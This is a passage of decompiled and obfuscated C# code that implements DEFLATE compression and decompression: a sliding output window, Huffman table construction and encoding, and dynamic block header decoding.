            if (true)
              num6 &= (int) short.MaxValue;
            repStart = num6;
          }
          else
            break;
        }
      }

      public void \u0001(int len, int dist)
      {
        if ((this.\u0004 += len) > 32768)
          throw new InvalidOperationException();
        int num1 = this.\u0003 - dist & (int) short.MaxValue;
        int num2 = 32768 - len;
        if (num1 <= num2 && this.\u0003 < num2)
        {
          if (len <= dist)
          {
            Array.Copy((Array) this.\u0001, num1, (Array) this.\u0001, this.\u0003, len);
            this.\u0003 += len;
          }
          else
          {
            while (len-- > 0)
              this.\u0001[this.\u0003++] = this.\u0001[num1++];
          }
        }
        else
          this.\u0001(num1, len, dist);
      }

      public int \u0001(\u0001.\u0002 input, int len)
      {
        int val1 = len;
        if (true)
        {
          int val2 = 32768 - this.\u0004;
          val1 = Math.Min(val1, val2);
        }
        int val2_1 = input.AvailableBytes;
        int num1;
        while (true)
        {
          int num2 = Math.Min(val1, val2_1);
          int num3;
          while (true)
          {
            len = num2;
            num3 = 32768;
            if (num3 == 0)
              num2 = num3;
            else
              break;
          }
          int length = num3 - this.\u0003;
label_4:
          if (len > length)
          {
            if (true)
            {
              num1 = input.\u0001(this.\u0001, this.\u0003, length);
              int num4 = num1;
              int num5 = length;
              if (true)
              {
                if (num4 != num5)
                  goto label_10;
              }
              else
              {
                val2_1 = num5;
                val1 = num4;
                continue;
              }
            }
            num1 += input.\u0001(this.\u0001, 0, len - length);
            goto label_10;
          }
label_9:
          num1 = input.\u0001(this.\u0001, this.\u0003, len);
label_10:
          this.\u0003 = this.\u0003 + num1 & (int) short.MaxValue;
          if (true)
          {
            this.\u0004 += num1;
            if (false)
              goto label_9;
            else
              break;
          }
          else
            goto label_4;
        }
        return num1;
      }

      public void \u0001(byte[] dict, int offset, int len)
      {
        if (this.\u0004 > 0)
          throw new InvalidOperationException();
        int num1 = len;
label_1:
        int num2;
        for (int index = 32768; num1 > index; num1 = num2)
        {
          num2 = offset;
          if (false)
          {
            num1 = num2;
            goto label_1;
          }
          else
          {
            int num3 = len;
            if (false)
            {
              index = num3;
            }
            else
            {
              if (true)
                num3 -= 32768;
              int num4 = num2 + num3;
              if (true)
              {
                if (true)
                  goto label_15;
label_7:
                num4 = 32768;
                goto label_16;
label_15:
                offset = num4;
                goto label_7;
              }
label_16:
              len = num4;
              break;
            }
          }
        }
        do
        {
          Array.Copy((Array) dict, offset, (Array) this.\u0001, 0, len);
          this.\u0003 = len & (int) short.MaxValue;
        }
        while (false);
      }

      public int \u0001() => 32768 - this.\u0004;

      public int \u0002() => this.\u0004;

      public int \u0001(byte[] output, int offset, int len)
      {
        int num1 = this.\u0003;
        if (len <= this.\u0004)
          goto label_17;
        else
          goto label_16;
label_3:
        int num2;
        do
        {
          num2 = len;
        }
        while (false);
        int num3 = len;
        int num4;
        int num5;
        int num6;
        if (true)
        {
          int num7 = num1;
          int length = num3 - num7;
          while (length > 0)
          {
            Array.Copy((Array) this.\u0001, 32768 - length, (Array) output, offset, length);
            if (true)
            {
              int num8 = offset;
              num6 = length;
              num5 = num8;
              goto label_9;
            }
          }
          goto label_11;
        }
        else
        {
          num4 = num3;
          goto label_18;
        }
label_9:
        offset = num5 + num6;
        if (true)
          len = num1;
        else
          goto label_12;
label_11:
        Array.Copy((Array) this.\u0001, num1 - len, (Array) output, offset, len);
        this.\u0004 -= num2;
label_12:
        if (this.\u0004 < 0)
          throw new InvalidOperationException();
        if (true)
          return num2;
        goto label_3;
label_16:
        len = this.\u0004;
        goto label_3;
label_17:
        num4 = this.\u0003;
label_18:
        int num9 = this.\u0004;
        num5 = num4 - num9;
        num6 = len;
        if (true)
        {
          num1 = num5 + num6 & (int) short.MaxValue;
          goto label_3;
        }
        else
          goto label_9;
      }

      public void \u0001() => this.\u0004 = this.\u0003 = 0;
    }

    internal sealed class \u0004
    {
      private const int \u0001 = 15;
      private short[] \u0001;
      public static readonly \u0001.\u0004 \u0001;
      public static readonly \u0001.\u0004 \u0002;

      static \u0004()
      {
        byte[] codeLengths = new byte[288];
label_1:
        int num1;
        while (true)
        {
          if (true)
            goto label_18;
label_3:
          if (true)
          {
            while (num1 < 144)
              codeLengths[num1++] = (byte) 8;
            if (true)
            {
              for (; num1 < 256; codeLengths[num1++] = (byte) 9)
              {
                if (false)
                  goto label_1;
              }
              goto label_7;
            }
            else
              break;
          }
          else
            goto label_10;
label_18:
          num1 = 0;
          goto label_3;
        }
        goto label_12;
label_7:
        int num2;
        int num3;
        while (true)
        {
          num2 = num1;
          num3 = 280;
          if (num3 != 0)
          {
            if (num2 < num3)
              codeLengths[num1++] = (byte) 7;
            else
              goto label_10;
          }
          else
            break;
        }
        int num4 = num3;
        int num5 = num2;
        goto label_15;
label_10:
        while (num1 < 288)
          codeLengths[num1++] = (byte) 8;
        \u0001.\u0004.\u0001 = new \u0001.\u0004(codeLengths);
        codeLengths = new byte[32];
label_12:
        num1 = 0;
label_14:
        num5 = num1;
        num4 = 32;
label_15:
        if (num5 < num4)
        {
          codeLengths[num1++] = (byte) 5;
          goto label_14;
        }
        else if (true)
          \u0001.\u0004.\u0002 = new \u0001.\u0004(codeLengths);
        else
          goto label_7;
      }

      public \u0004(byte[] codeLengths) => this.\u0001(codeLengths);

      private void \u0001(byte[] codeLengths)
      {
        int[] numArray1 = new int[16];
        int[] numArray2 = new int[16];
        int index1 = 0;
        int num1;
        int num2;
        while (true)
        {
          num1 = index1;
          num2 = codeLengths.Length;
          if (true)
          {
            int num3 = num2;
            if (num1 < num3)
            {
              int codeLength = (int) codeLengths[index1];
              int num4;
              if (true)
                num4 = codeLength;
              if (num4 > 0)
              {
                int[] numArray3;
                int index2;
                (numArray3 = numArray1)[index2 = num4] = numArray3[(IntPtr) index2] + 1;
              }
              ++index1;
            }
            else
              break;
          }
          else
            goto label_8;
        }
        int toReverse1 = 0;
        int length = 512;
        int index3;
        if (true)
        {
          index3 = 1;
          goto label_14;
        }
        else
          goto label_35;
label_8:
        int num5 = 16;
        int num6 = index3;
        if (true)
        {
          int num7 = num5 - num6 & 31;
          int num8 = num2 << num7;
          toReverse1 = num1 + num8;
        }
        else
          goto label_19;
label_10:
        if (index3 >= 10)
        {
          int num9 = numArray2[index3] & 130944;
          int num10 = toReverse1 & 130944;
          length += num10 - num9 >> 16 - index3;
        }
        int num11 = index3;
        int num12 = 1;
label_13:
        index3 = num11 + num12;
label_14:
        int num13;
        int index4;
        if (index3 <= 15)
        {
          numArray2[index3] = toReverse1;
          int num14 = toReverse1;
          num2 = numArray1[index3];
          num1 = num14;
          goto label_8;
        }
        else
        {
          this.\u0001 = new short[length];
          num13 = 512;
          index4 = 15;
          goto label_22;
        }
label_16:
        int num15 = toReverse1 & 130944;
        toReverse1 -= numArray1[index4] << 16 - index4;
        int toReverse2 = toReverse1 & 130944;
        goto label_20;
label_18:
        int num16;
        int num17 = num16 - 9;
        num6 = 31;
        num5 = num17;
        int num18;
        num2 = num18;
        int num19;
        num1 = num19;
label_19:
        int num20 = num5 & num6;
        int num21 = num2 << num20;
        num13 = num1 + num21;
        toReverse2 += 128;
label_20:
        if (toReverse2 < num15)
        {
          this.\u0001[(int) \u0001.\u0007.\u0001(toReverse2)] = (short) (-num13 << 4 | index4);
          num19 = num13;
          num18 = 1;
          num16 = index4;
          goto label_18;
        }
        else
          --index4;
label_22:
        int index5;
        if (index4 < 10)
        {
          if (true)
          {
            index5 = 0;
            goto label_37;
          }
          else
            goto label_10;
        }
        else
          goto label_16;
label_35:
        int codeLength1;
        numArray2[codeLength1] = toReverse1 + (1 << 16 - codeLength1);
label_36:
        ++index5;
label_37:
        if (index5 >= codeLengths.Length)
          return;
        codeLength1 = (int) codeLengths[index5];
        if (codeLength1 != 0)
        {
          toReverse1 = numArray2[codeLength1];
          int index6 = (int) \u0001.\u0007.\u0001(toReverse1);
          if (codeLength1 <= 9)
          {
            do
            {
              this.\u0001[index6] = (short) (index5 << 4 | codeLength1);
              index6 += 1 << codeLength1;
              if (false)
                goto label_16;
            }
            while (index6 < 512);
            goto label_35;
          }
          else
          {
            int num22 = (int) this.\u0001[index6 & 511];
            int num23 = 1 << (num22 & 15);
            int num24 = -(num22 >> 4);
            int num25;
            int num26;
            int num27;
            int num28;
            int num29;
            int num30;
            do
            {
              this.\u0001[num24 | index6 >> 9] = (short) (index5 << 4 | codeLength1);
              num25 = index6;
              num26 = 1;
              num27 = codeLength1 & 31;
              if (true)
              {
                num28 = num26 << num27;
                if (true)
                {
                  index6 = num25 + num28;
                  num29 = index6;
                  num30 = num23;
                  if (false)
                    goto label_43;
                }
                else
                  goto label_42;
              }
              else
                goto label_41;
            }
            while (num29 < num30);
            goto label_35;
label_43:
            num2 = num30;
            num1 = num29;
            goto label_8;
label_42:
            num12 = num28;
            num11 = num25;
            goto label_13;
label_41:
            num16 = num27;
            num18 = num26;
            num19 = num25;
            goto label_18;
          }
        }
        else
          goto label_36;
      }

      public int \u0001(\u0001.\u0002 input)
      {
        int num1;
        int index = num1 = input.\u0001(9);
        int num2;
        int num3;
        int num4;
        int num5;
        int num6;
        int num7;
        while (true)
        {
          if (num1 < 0)
            goto label_19;
          else
            goto label_27;
label_8:
          int availableBits1;
          int num8;
          if (true)
          {
            if (num4 < 0)
            {
              availableBits1 = input.AvailableBits;
              index = input.\u0001(availableBits1);
              num8 = (int) this.\u0001[num3 | index >> 9];
            }
            else
              break;
          }
          else
            goto label_11;
label_14:
          num2 = num8;
          if ((num2 & 15) <= availableBits1)
          {
            input.\u0001(num2 & 15);
            num5 = num2 >> 4;
          }
          else
            goto label_18;
label_16:
          if (false)
          {
            num1 = num5;
            continue;
          }
          goto label_12;
label_19:
          int availableBits2 = input.AvailableBits;
          index = input.\u0001(availableBits2);
          num2 = (int) this.\u0001[index];
          num4 = num2;
          if (true)
          {
            if (num4 >= 0)
            {
              num6 = num2 & 15;
              if (true)
              {
                if (false)
                {
                  num8 = num6;
                  goto label_14;
                }
                else
                {
                  int num9 = availableBits2;
                  if (num6 <= num9)
                  {
                    input.\u0001(num2 & 15);
                    num7 = num2;
                    if (false)
                    {
                      num5 = num7;
                      goto label_16;
                    }
                    else
                      goto label_25;
                  }
                  else
                    goto label_26;
                }
              }
              else
                goto label_6;
            }
            else
              goto label_26;
          }
          else
            goto label_8;
label_27:
          int num10 = (int) this.\u0001[index];
          int num11;
          while (true)
          {
            if (true)
              goto label_28;
label_4:
            num11 = 0;
            if (num11 != 0)
            {
              num10 = num11;
              continue;
            }
            break;
label_28:
            num2 = num10;
            goto label_4;
          }
          if (num10 < num11)
          {
            num3 = -(num2 >> 4);
            int n = num2 & 15;
            num4 = index = input.\u0001(n);
            goto label_8;
          }
          else
            goto label_29;
        }
        int num12 = (int) this.\u0001[num3 | index >> 9];
        input.\u0001(num12 & 15);
        num4 = num12;
label_11:
        return num4 >> 4;
label_12:
        return num5;
label_18:
        return -1;
label_6:
        return num6;
label_25:
        return num7 >> 4;
label_26:
        return -1;
label_29:
        \u0001.\u0002 obj = input;
        int n1 = num2 & 15;
        if (true)
          obj.\u0001(n1);
        return num2 >> 4;
      }
    }

    internal sealed class \u0005
    {
      private const int \u0001 = 0;
      private const int \u0002 = 1;
      private const int \u0003 = 2;
      private const int \u0004 = 3;
      private const int \u0005 = 4;
      private const int \u0006 = 5;
      private static readonly int[] \u0001;
      private static readonly int[] \u0002;
      private byte[] \u0001;
      private byte[] \u0002;
      private \u0001.\u0004 \u0001;
      private int \u0007;
      private int \u0008;
      private int \u000E;
      private int \u000F;
      private int \u0010;
      private int \u0011;
      private byte \u0001;
      private int \u0012;
      private static readonly int[] \u0003;

      public bool \u0001(\u0001.\u0002 input)
      {
        int num1;
        while (true)
        {
          int num2;
          int num3;
          int num4;
          int num5;
          switch (this.\u0007)
          {
            case 0:
              this.\u0008 = input.\u0001(5);
              num1 = this.\u0008;
              if (true)
              {
                if (num1 >= 0)
                {
                  this.\u0008 += 257;
                  input.\u0001(5);
                  this.\u0007 = 1;
                  goto case 1;
                }
                else
                  goto label_4;
              }
              else
                goto label_2;
            case 1:
              this.\u000E = input.\u0001(5);
              if (this.\u000E >= 0)
              {
                ++this.\u000E;
                input.\u0001(5);
                this.\u0010 = this.\u0008 + this.\u000E;
                this.\u0002 = new byte[this.\u0010];
                this.\u0007 = 2;
                goto case 2;
              }
              else
                goto label_7;
            case 2:
              this.\u000F = input.\u0001(4);
              if (this.\u000F >= 0)
              {
                this.\u000F += 4;
                input.\u0001(4);
                this.\u0001 = new byte[19];
                this.\u0012 = 0;
                this.\u0007 = 3;
                goto case 3;
              }
              else
                goto label_10;
            case 3:
label_16:
              if (this.\u0012 < this.\u000F)
              {
                num2 = input.\u0001(3);
                num3 = num2;
                num4 = 0;
                break;
              }
              this.\u0001 = new \u0001.\u0004(this.\u0001);
              this.\u0001 = (byte[]) null;
              this.\u0012 = 0;
              this.\u0007 = 4;
              goto case 4;
            case 4:
              int num6;
              int num7;
              int num8;
              do
              {
                num5 = this.\u0001.\u0001(input);
                if (true)
                {
                  num6 = num5;
                  if ((num5 & -16) == 0)
                  {
                    this.\u0002[this.\u0012++] = this.\u0001 = (byte) num6;
                    num7 = this.\u0012;
                    num8 = this.\u0010;
                    if (false)
                      goto label_1;
                  }
                  else
                    goto label_23;
                }
                else
                  goto label_34;
              }
              while (num7 != num8);
              goto label_20;
label_1:
              num4 = num8;
              num3 = num7;
              break;
label_23:
              if (num6 >= 0)
              {
                if (num6 >= 17)
                  this.\u0001 = (byte) 0;
                this.\u0011 = num6 - 16;
                this.\u0007 = 5;
                goto case 5;
              }
              else
                goto label_24;
            case 5:
              int n = \u0001.\u0005.\u0002[this.\u0011];
              int num9 = input.\u0001(n);
              if (num9 >= 0)
              {
                input.\u0001(n);
                int num10 = num9 + \u0001.\u0005.\u0001[this.\u0011];
                while (num10-- > 0)
                  this.\u0002[this.\u0012++] = this.\u0001;
                int num11 = this.\u0012;
                num5 = this.\u0010;
                num5 = num11;
                goto label_34;
              }
              else
                goto label_29;
            default:
              continue;
          }
          if (num3 >= num4)
          {
            input.\u0001(3);
            this.\u0001[\u0001.\u0005.\u0003[this.\u0012]] = (byte) num2;
            ++this.\u0012;
            goto label_16;
          }
          else
            goto label_14;
label_34:
          if (num5 != num5)
            this.\u0007 = 4;
          else
            goto label_35;
        }
label_2:
        return num1 != 0;
label_4:
        return false;
label_7:
        return false;
label_10:
        return false;
label_14:
        return false;
label_20:
        return true;
label_24:
        return false;
label_29:
        return false;
label_35:
        return true;
      }

      public \u0001.\u0004 \u0001()
      {
        byte[] numArray = new byte[this.\u0008];
        Array.Copy((Array) this.\u0002, 0, (Array) numArray, 0, this.\u0008);
        return new \u0001.\u0004(numArray);
      }

      public \u0001.\u0004 \u0002()
      {
        byte[] numArray = new byte[this.\u000E];
        Array.Copy((Array) this.\u0002, this.\u0008, (Array) numArray, 0, this.\u000E);
        return new \u0001.\u0004(numArray);
      }

      static \u0005()
      {
label_0:
        int length1 = 3;
        int length2;
        while (true)
        {
          int[] numArray1 = new int[length1];
          // ISSUE: field reference
          RuntimeHelpers.InitializeArray((Array) numArray1, __fieldref (\u0005.\u0003.\u0001));
          \u0001.\u0005.\u0001 = numArray1;
          do
          {
            if (true)
            {
              length2 = 3;
              if (length2 != 0)
              {
                int[] numArray2 = new int[length2];
                // ISSUE: field reference
                RuntimeHelpers.InitializeArray((Array) numArray2, __fieldref (\u0005.\u0003.\u0001));
                \u0001.\u0005.\u0002 = numArray2;
              }
              else
                goto label_6;
            }
            else
              goto label_0;
          }
          while (false);
          length2 = 19;
label_6:
          if (length2 == 0)
            length1 = length2;
          else
            break;
        }
        int[] numArray = new int[length2];
        // ISSUE: field reference
        RuntimeHelpers.InitializeArray((Array) numArray, __fieldref (\u0005.\u0003.\u0001));
        \u0001.\u0005.\u0003 = numArray;
      }
    }

    internal sealed class \u0006
    {
      private const int \u0001 = 4;
      private const int \u0002 = 8;
      private const int \u0003 = 16;
      private const int \u0004 = 20;
      private const int \u0005 = 28;
      private const int \u0006 = 30;
      private int \u0007 = 16;
      private long \u0001 = 0;
      private \u0001.\u000E \u0001;
      private \u0001.\u0008 \u0001;

      public \u0006()
      {
        this.\u0001 = new \u0001.\u000E();
        this.\u0001 = new \u0001.\u0008(this.\u0001);
      }

      public long TotalOut => this.\u0001;

      public void \u0001() => this.\u0007 |= 12;

      public bool IsFinished => this.\u0007 == 30 && this.\u0001.IsFlushed;

      public bool IsNeedingInput => this.\u0001.\u0001();

      public void \u0001(byte[] buffer) => this.\u0001.\u0001(buffer);

      public int \u0001(byte[] output)
      {
        int offset = 0;
        int length = output.Length;
label_22:
        int num1 = length;
label_23:
        do
        {
          int num2 = this.\u0001.\u0001(output, offset, length);
          offset += num2;
          this.\u0001 += (long) num2;
          length -= num2;
          if (true)
          {
            if (length == 0 || this.\u0007 == 30)
              goto label_21;
          }
          else
            goto label_22;
        }
        while (this.\u0001.\u0002((this.\u0007 & 4) != 0, (this.\u0007 & 8) != 0));
label_4:
        while (this.\u0007 != 16)
        {
          int num3;
          int num4;
          while (true)
          {
            if (this.\u0007 == 20)
            {
              if (true)
              {
                int num5 = 8;
                if (num5 == 0)
                  return num5;
                int num6 = -this.\u0001.BitCount;
                if (true)
                {
                  num3 = num5 + (num6 & 7);
                  goto label_12;
                }
                else
                {
                  num4 = num6;
                  num3 = num5;
                  goto label_16;
                }
              }
            }
            else if (true)
            {
              if (this.\u0007 == 28)
              {
                this.\u0001.\u0001();
                this.\u0007 = 30;
                goto label_23;
              }
              else
                goto label_23;
            }
            else
              goto label_4;
          }
          goto label_14;
label_12:
          int num7 = num3;
label_14:
          num3 = num7;
          if (true)
            num4 = 0;
          else
            goto label_12;
label_16:
          if (num3 > num4)
          {
            this.\u0001.\u0001(2, 10);
            num7 -= 10;
            goto label_14;
          }
          else
          {
            this.\u0007 = 16;
            goto label_23;
          }
        }
        return num1 - length;
label_21:
        return num1 - length;
      }
    }

    internal sealed class \u0007
    {
      private const int \u0001 = 16384;
      private const int \u0002 = 286;
      private const int \u0003 = 30;
      private const int \u0004 = 19;
      private const int \u0005 = 16;
      private const int \u0006 = 17;
      private const int \u0007 = 18;
      private const int \u0008 = 256;
      private static readonly int[] \u0001;
      private static readonly byte[] \u0001;
      private \u0001.\u000E \u0001;
      private \u0001.\u0007.\u0001 \u0001;
      private \u0001.\u0007.\u0001 \u0002;
      private \u0001.\u0007.\u0001 \u0003;
      private short[] \u0001;
      private byte[] \u0002;
      private int \u000E;
      private int \u000F;
      private static readonly short[] \u0002;
      private static readonly byte[] \u0003;
      private static readonly short[] \u0003;
      private static readonly byte[] \u0004;

      public static short \u0001(int toReverse) => (short) ((int) \u0001.\u0007.\u0001[toReverse & 15] << 12 | (int) \u0001.\u0007.\u0001[toReverse >> 4 & 15] << 8 | (int) \u0001.\u0007.\u0001[toReverse >> 8 & 15] << 4 | (int) \u0001.\u0007.\u0001[toReverse >> 12]);

      static \u0007()
      {
label_0:
        \u0001.\u0007.\u0001 = new int[19]
        {
          16,
          17,
          18,
          0,
          8,
          7,
          9,
          6,
          10,
          5,
          11,
          4,
          12,
          3,
          13,
          2,
          14,
          1,
          15
        };
label_1:
        \u0001.\u0007.\u0001 = new byte[16]
        {
          (byte) 0,
          (byte) 8,
          (byte) 4,
          (byte) 12,
          (byte) 2,
          (byte) 10,
          (byte) 6,
          (byte) 14,
          (byte) 1,
          (byte) 9,
          (byte) 5,
          (byte) 13,
          (byte) 3,
          (byte) 11,
          (byte) 7,
          (byte) 15
        };
        \u0001.\u0007.\u0002 = new short[286];
        \u0001.\u0007.\u0003 = new byte[286];
        int index;
        if (true)
        {
          index = 0;
          goto label_23;
        }
        else
          goto label_7;
label_4:
        if (true)
        {
          \u0001.\u0007.\u0003[index++] = (byte) 8;
          goto label_23;
        }
        else
          goto label_8;
label_7:
        \u0001.\u0007.\u0003[index++] = (byte) 9;
label_8:
        if (index < 256)
        {
          \u0001.\u0007.\u0002[index] = \u0001.\u0007.\u0001(256 + index << 7);
          goto label_7;
        }
        else
        {
          if (true)
          {
            while (true)
            {
              int num1 = index;
label_13:
              if (num1 < 280)
              {
                \u0001.\u0007.\u0002[index] = \u0001.\u0007.\u0001(index - 256 << 9);
                if (true)
                  \u0001.\u0007.\u0003[index++] = (byte) 7;
                else
                  goto label_0;
              }
              else
              {
                for (; index < 286; \u0001.\u0007.\u0003[index++] = (byte) 8)
                  \u0001.\u0007.\u0002[index] = \u0001.\u0007.\u0001(index - 88 << 8);
                \u0001.\u0007.\u0003 = new short[30];
                \u0001.\u0007.\u0004 = new byte[30];
                if (true)
                {
                  int num2;
                  for (index = 0; index < 30; index = num2 + 1)
                  {
                    \u0001.\u0007.\u0003[index] = \u0001.\u0007.\u0001(index << 11);
                    if (true)
                    {
                      \u0001.\u0007.\u0004[index] = (byte) 5;
                      num2 = index;
                      if (false)
                      {
                        num1 = num2;
                        goto label_13;
                      }
                    }
                    else
                      goto label_1;
                  }
                  break;
                }
                goto label_4;
              }
            }
            return;
          }
          goto label_0;
        }
label_23:
        if (index < 144)
        {
          \u0001.\u0007.\u0002[index] = \u0001.\u0007.\u0001(48 + index << 8);
          goto label_4;
        }
        else
          goto label_8;
      }

      public \u0007(\u0001.\u000E pending)
      {
        this.\u0001 = pending;
        this.\u0001 = new \u0001.\u0007.\u0001(this, 286, 257, 15);
        this.\u0002 = new \u0001.\u0007.\u0001(this, 30, 1, 15);
        this.\u0003 = new \u0001.\u0007.\u0001(this, 19, 4, 7);
        this.\u0001 = new short[16384];
        this.\u0002 = new byte[16384];
      }

      public void \u0001()
      {
        this.\u000E = 0;
        this.\u000F = 0;
      }

      private int \u0001(int len)
      {
        int num1 = len;
        int num2;
        if (true)
        {
          if (num1 == (int) byte.MaxValue)
            return 285;
          if (true)
          {
            num2 = 257;
            goto label_14;
          }
          else
            goto label_14;
        }
        else
          goto label_12;
label_5:
        int num3;
        if (true)
          num3 >>= 1;
        len = num3;
        goto label_14;
label_12:
        num2 = num1;
        num3 = len;
        goto label_5;
label_14:
        int num4 = len;
        if (false)
        {
          num3 = num4;
          goto label_5;
        }
        else
        {
          int num5 = 8;
          if (num5 != 0)
          {
            if (num4 >= num5)
            {
              num1 = num2 + 4;
              goto label_12;
            }
            else
            {
              int num6 = num2;
              num5 = len;
              num4 = num6;
            }
          }
          return num4 + num5;
        }
      }

      private int \u0002(int distance)
      {
        int num1;
        do
        {
          if (true)
            goto label_10;
label_1:
          continue;
label_10:
          num1 = 0;
          goto label_1;
        }
        while (false);
        int num2;
        while (true)
        {
          int num3 = distance;
          int num4 = 4;
          int num5;
          int num6;
          while (true)
          {
            if (num3 >= num4)
              goto label_11;
            else
              goto label_13;
label_4:
            num6 = 1;
            int num7;
            num5 = num7;
label_5:
            if (num6 == 0)
            {
              num4 = num6;
              num3 = num5;
              continue;
            }
            break;
label_11:
            num5 = num1;
            num6 = 2;
            if (num6 != 0)
            {
              num1 = num5 + num6;
              num7 = distance;
              goto label_4;
            }
            else
              goto label_5;
label_13:
            num2 = num1 + distance;
            if (false)
            {
              num7 = num2;
              goto label_4;
            }
            else
              goto label_9;
          }
          distance = num5 >> num6;
        }
label_9:
        return num2;
      }

      public void \u0001(int blTreeCodes)
      {
        \u0001.\u0007.\u0001 obj = this.\u0003;
        if (true)
          obj.\u0001();
        this.\u0001.\u0001();
        this.\u0002.\u0001();
        this.\u0001.\u0001(this.\u0001.\u0002 - 257, 5);
        this.\u0001.\u0001(this.\u0002.\u0002 - 1, 5);
        this.\u0001.\u0001(blTreeCodes - 4, 4);
        for (int index = 0; index < blTreeCodes; ++index)
          this.\u0001.\u0001((int) this.\u0003.\u0001[\u0001.\u0007.\u0001[index]], 3);
        this.\u0001.\u0002(this.\u0003);
        this.\u0002.\u0002(this.\u0003);
      }

      public void \u0002()
      {
        int num1 = 0;
        if (num1 != 0)
          goto label_10;
        else
          goto label_20;
label_1:
        int code1;
        int num2 = code1 - 261;
label_2:
        int num3 = 4;
        int num4;
        int distance;
        int code2;
        int num5;
        int num6;
        if (num3 != 0)
        {
          int count = num2 / num3;
          num5 = count;
          num6 = 0;
          if (num6 == 0)
          {
            if (num5 > num6 && count <= 5)
              this.\u0001.\u0001(num4 & (1 << count) - 1, count);
            if (true)
              code2 = this.\u0002(distance);
            else
              goto label_1;
          }
          else
            goto label_17;
        }
        else
          goto label_22;
label_8:
        this.\u0002.\u0001(code2);
        num1 = code2;
label_9:
        num1 = num1 / 2 - 1;
label_10:
        if (true)
        {
          int count = num1;
          if (count > 0)
          {
            if (true)
              this.\u0001.\u0001(distance & (1 << count) - 1, count);
            else
              goto label_8;
          }
        }
        else
          goto label_9;
label_15:
        int index;
        num2 = index;
        if (true)
        {
          num6 = 1;
          num5 = num2;
        }
        else
          goto label_2;
label_17:
        index = num5 + num6;
label_18:
        if (index >= this.\u000E)
        {
          this.\u0001.\u0001(256);
          return;
        }
        num4 = (int) this.\u0002[index] & (int) byte.MaxValue;
        int num7 = (int) this.\u0001[index];
        num3 = num7 - 1;
        num2 = num7;
        goto label_22;
label_20:
        index = num1;
        goto label_18;
label_22:
        distance = num3;
        if (num2 == 0)
        {
          this.\u0001.\u0001(num4);
          goto label_15;
        }
        else
        {
          code1 = this.\u0001(num4);
          this.\u0001.\u0001(code1);
          goto label_1;
        }
      }

      public void \u0001(byte[] stored, int storedOffset, int storedLength, bool lastBlock)
      {
        this.\u0001.\u0001(lastBlock ? 1 : 0, 3);
        this.\u0001.\u0001();
        this.\u0001.\u0001(storedLength);
        this.\u0001.\u0001(~storedLength);
        this.\u0001.\u0001(stored, storedOffset, storedLength);
        this.\u0001();
      }

      public void \u0002(byte[] stored, int storedOffset, int storedLength, bool lastBlock)
      {
        short[] numArray;
        (numArray = this.\u0001.\u0001)[256] = (short) ((int) numArray[256] + 1);
        this.\u0001.\u0002();
        this.\u0002.\u0002();
        if (true)
          goto label_25;
label_6:
        int blTreeCodes;
        int index1;
        int num1;
        int num2;
        int num3;
        while (true)
        {
          int num4;
          int num5;
          if (index1 > blTreeCodes)
          {
            num4 = (int) this.\u0003.\u0001[\u0001.\u0007.\u0001[index1]];
            num5 = 0;
          }
          else
            goto label_7;
label_2:
          if (num4 > num5)
          {
            num3 = index1;
            if (true)
              blTreeCodes = num3 + 1;
            else
              goto label_21;
          }
          --index1;
          continue;
label_7:
          num1 = 14 + blTreeCodes * 3 + this.\u0003.\u0001() + this.\u0001.\u0001() + this.\u0002.\u0001() + this.\u000F;
          num2 = this.\u000F;
          for (int index2 = 0; index2 < 286; ++index2)
            num2 += (int) this.\u0001.\u0001[index2] * (int) \u0001.\u0007.\u0003[index2];
          for (int index3 = 0; index3 < 30; ++index3)
          {
            int num6 = num2;
            int num7 = (int) this.\u0002.\u0001[index3] * (int) \u0001.\u0007.\u0004[index3];
            if (false)
            {
              num5 = num7;
              num4 = num6;
              goto label_2;
            }
            else
              num2 = num6 + num7;
          }
          break;
        }
        if (num1 >= num2)
          num1 = num2;
        if (storedOffset >= 0)
        {
          if (true)
          {
            if (storedLength + 4 < num1 >> 3)
            {
              this.\u0001(stored, storedOffset, storedLength, lastBlock);
              return;
            }
          }
          else
            goto label_24;
        }
        num3 = num1;
label_21:
        int num8 = num2;
        if (num3 == num8)
        {
          this.\u0001.\u0001(2 + (lastBlock ? 1 : 0), 3);
          this.\u0001.\u0001(\u0001.\u0007.\u0002, \u0001.\u0007.\u0003);
          this.\u0002.\u0001(\u0001.\u0007.\u0003, \u0001.\u0007.\u0004);
          this.\u0002();
          this.\u0001();
          return;
        }
        this.\u0001.\u0001(4 + (lastBlock ? 1 : 0), 3);
label_24:
        this.\u0001(blTreeCodes);
        this.\u0002();
        this.\u0001();
        return;
label_25:
        this.\u0001.\u0001(this.\u0003);
        this.\u0002.\u0001(this.\u0003);
        this.\u0003.\u0002();
        blTreeCodes = 4;
        index1 = 18;
        goto label_6;
      }

      public bool \u0001() => this.\u000E >= 16384;

      public bool \u0001(int lit)
      {
        this.\u0001[this.\u000E] = (short) 0;
        byte[] numArray1 = this.\u0002;
        \u0001.\u0007 obj = this;
        int num1;
        int num2 = num1 = obj.\u000E;
        obj.\u000E = num1 + 1;
        int index1 = num2;
        int num3 = (int) (byte) lit;
        numArray1[index1] = (byte) num3;
        short[] numArray2;
        int index2;
        (numArray2 = this.\u0001.\u0001)[index2 = lit] = (short) ((int) numArray2[(IntPtr) index2] + 1);
        return this.\u0001();
      }

      public bool \u0001(int dist, int len)
      {
        this.\u0001[this.\u000E] = (short) dist;
        byte[] numArray1 = this.\u0002;
        \u0001.\u0007 obj = this;
        int num1 = obj.\u000E;
        if (true)
          goto label_6;
label_1:
        obj.\u000E = num1 + 1;
        int num2;
        int index1 = num2;
        int num3 = (int) (byte) (len - 3);
        numArray1[index1] = (byte) num3;
        int num4 = this.\u0001(len - 3);
        short[] numArray2;
        IntPtr index2;
        (numArray2 = this.\u0001.\u0001)[(int) (index2 = (IntPtr) num4)] = (short) ((int) numArray2[index2] + 1);
        if (num4 >= 265 && num4 < 285)
          this.\u000F += (num4 - 261) / 4;
        int num5 = this.\u0002(dist - 1);
        short[] numArray3;
        IntPtr index3;
        (numArray3 = this.\u0002.\u0001)[(int) (index3 = (IntPtr) num5)] = (short) ((int) numArray3[index3] + 1);
        if (num5 >= 4)
          this.\u000F += num5 / 2 - 1;
        return this.\u0001();
label_6:
        num2 = num1;
        goto label_1;
      }

      public sealed class \u0001
      {
        public short[] \u0001;
        public byte[] \u0001;
        public int \u0001;
        public int \u0002;
        private short[] \u0002;
        private int[] \u0001;
        private int \u0003;
        private \u0001.\u0007 \u0001;

        public \u0001(\u0001.\u0007 dh, int elems, int minCodes, int maxLength)
        {
          this.\u0001 = dh;
          this.\u0001 = minCodes;
          this.\u0003 = maxLength;
